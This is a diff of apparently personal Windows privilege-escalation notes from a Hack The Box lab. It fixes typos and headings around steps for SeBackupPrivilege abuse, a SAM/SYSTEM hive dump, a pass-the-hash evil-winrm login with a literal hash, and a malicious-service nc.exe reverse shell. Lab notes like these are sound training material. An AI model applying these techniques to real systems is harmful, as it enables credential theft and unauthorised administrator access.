@@ -1,5 +1,5 @@
 ## Start here
-Check user priveleges
+Check user privileges
 ```
 whoami /priv
 ```
@@ -17,13 +17,8 @@ Interesting entries include:
 
   
 ## SeBackupPrivilege
-SeBackupPrivilege exploitation
-```
-whoami /priv
-Privilege Name                Description                    State
-============================= ============================== =======
-SeBackupPrivilege             Back up files and directories  Enabled
-```
+SeBackupPrivilege privilege exploitation
+
 Obtain SAM and SYSTEM registry hives
 ```
 # Using evil-winrm session to the victim host
@@ -50,6 +45,8 @@ evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
 ```
 
 ## Server Operators
+Server Operators group exploitation
+
 Create malicious service that creates privileged reverse shell nc.exe
 ```
 # Using evil-winrm session, place the nc.exe in the same folder on Kali linux
